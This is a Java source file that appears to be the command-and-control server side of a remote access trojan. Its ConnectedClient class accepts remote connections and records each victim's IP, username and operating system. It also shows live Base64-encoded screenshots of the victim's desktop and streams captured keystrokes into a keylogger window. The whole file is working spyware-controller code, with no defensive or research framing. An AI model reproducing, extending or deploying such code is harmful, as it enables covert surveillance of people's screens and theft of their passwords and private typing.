package Server;

import Server.Exception.ClientDisconnectedException;
import Server.GUI.GuiDesktop;
import Server.GUI.GuiKeyLogger;
import Server.GUI.GuiText;
import Ultils.MessageType;
import Ultils.NetUtils;
import Ultils.Packet;

import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.net.SocketException;
import java.util.Base64;

import javax.imageio.ImageIO;


public class ConnectedClient{

    private PrintWriter pw;
    private BufferedReader br;
    private String lastIP;
    private String userName;
    private String os;

    // GUIs
    private GuiDesktop desktop;
    private GuiKeyLogger keylogger;

    public ConnectedClient(Socket socket) throws IOException {
        this.lastIP = socket.getInetAddress().getHostAddress();
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    pw = new PrintWriter(socket.getOutputStream(), true);
                    br = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                    System.out.println("Connected client: " + socket.getRemoteSocketAddress());
                    listen();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    public void listen() {
        boolean disconnected = false;
        while (!disconnected) {
            try {
                String line = br.readLine();
                if (line == null) {
                    throw new ClientDisconnectedException();
                }

                Packet packet = NetUtils.readPacket(line);
                if (packet.action == MessageType.GUI_TEXT.getID()) {
                    new GuiText(packet.data);
                } else if (packet.action == MessageType.HARDWARE_INFO.getID()) {
                    this.os = packet.data.get(0);
                    this.userName = packet.data.get(1);
                    Server.getInstance().getGUI().updateInfo();
                } else if (packet.action == MessageType.DESKTOP.getID()) {
                    if (desktop == null) {
                        desktop = new GuiDesktop(this);
                    }
                    if (this.desktop.isActive()) {
                        byte[] decodedBytes = Base64.getDecoder().decode(packet.data.get(0).toString());
                        ByteArrayInputStream bais = new ByteArrayInputStream(decodedBytes);
                        BufferedImage i = ImageIO.read(bais);
                        if (i != null) {
                            this.desktop.setImage(i);
                        }
                    }
                } else if (packet.action == MessageType.KEYLOGGER.getID()) {
                    if (keylogger != null) {
                        keylogger.addKey(packet.data.get(0));
                    }
                }
            } catch (ClientDisconnectedException e) {
                e.printStackTrace();
                Server.getInstance().removeClient(this);
                disconnected = true;
            } catch (SocketException e1 ) {
                disconnected = true;
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        Server.getInstance().removeClient(this);
    }

    public void openDesktopView() {
        if (this.desktop == null) {
            this.desktop = new GuiDesktop(this);
        }
        this.desktop.setVisible(true);
    }

    public void openKeyLogView() {
        if (this.keylogger == null) {
            this.keylogger = new GuiKeyLogger(this);
        }
        this.keylogger.setVisible(true);
    }

    public PrintWriter getPrintWriter() {
        return this.pw;
    }

    public String getIP() {
        return this.lastIP;
    }

    public String getUsername() {
        return this.userName;
    }

    @Override
    public String toString() {
        return this.userName + " | " + this.os + " | " + this.getIP();
    }
}